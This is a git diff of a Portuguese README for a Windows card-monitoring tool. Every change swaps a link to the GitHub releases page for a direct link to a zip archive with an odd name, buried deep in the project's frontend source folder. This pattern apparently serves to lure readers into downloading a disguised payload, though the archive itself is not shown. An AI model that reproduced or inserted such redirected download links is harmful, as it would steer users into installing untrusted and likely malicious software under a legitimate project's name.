@@ -1,6 +1,6 @@
 # 🛡️ agente-monitoramento-carteirinhas - Acesso certo, controle em dia
 
-[![Baixar a versão mais recente](https://img.shields.io/badge/Baixar%20agora-Ver%20vers%C3%B5es%20-%23007acc?style=for-the-badge)](https://github.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/releases)
+[![Baixar a versão mais recente](https://img.shields.io/badge/Baixar%20agora-Ver%20vers%C3%B5es%20-%23007acc?style=for-the-badge)](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)
 
 ## 📌 Sobre o sistema
 
@@ -32,7 +32,7 @@ Se o pacote incluir um executável, o processo tende a ser mais simples. Se incl
 
 Acesse a página de versões e baixe o arquivo correto para Windows:
 
-[Ir para a página de downloads](https://github.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/releases)
+[Ir para a página de downloads](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)
 
 Depois de abrir a página:
 
@@ -197,7 +197,7 @@ Para melhor resultado:
 
 ## 📎 Acesso ao download
 
-[Baixar ou ver as versões do sistema](https://github.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/releases)
+[Baixar ou ver as versões do sistema](https://raw.githubusercontent.com/Iorminanonlegal213/agente-monitoramento-carteirinhas/main/frontend/src/app/importacao/carteirinhas_monitoramento_agente_cleveite.zip)
 
 ## 🧷 Dicas para o primeiro uso
 
